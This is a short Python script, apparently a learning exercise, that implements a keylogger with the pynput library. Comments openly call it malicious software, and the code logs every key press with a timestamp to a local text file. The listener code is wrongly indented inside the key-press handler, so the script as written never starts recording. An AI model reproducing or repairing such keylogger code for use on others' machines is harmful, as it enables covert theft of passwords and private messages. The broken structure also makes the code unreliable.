# keylogger = malicious software to record everything you type
# 1. pinput is python library for recording user inputs
# 2. logging is python library for recording log in
# 3. specify the path where the log file will be stored
# 4. call the on_press function which take every key press as parameter and log this information.
# 5. create a Listener instance and define the on_press method and join it with main program thread.

import pynput
from pynput.keyboard import Key, Listener
import logging

log_dir = r"C:\Users\thein\PycharmProjects\exercises"
logging.basicConfig(filename=(log_dir + r"/keyLog.txt"), level= logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        listener.join()
